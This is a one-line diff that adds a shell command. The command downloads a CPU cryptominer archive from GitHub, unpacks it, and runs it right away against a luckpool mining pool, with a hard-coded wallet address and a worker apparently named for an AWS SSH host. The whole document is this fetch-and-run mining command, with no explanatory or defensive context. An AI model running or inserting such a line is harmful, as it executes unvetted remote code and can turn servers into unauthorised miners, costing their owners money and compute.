@@ -1,0 +1,1 @@
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+ssl://na.luckpool.net:3956 -u RTMnP39ZBF9UJB2xKDT7FAp8iZ2eW7wemU.awssh01 -p hybrid --cpu 8
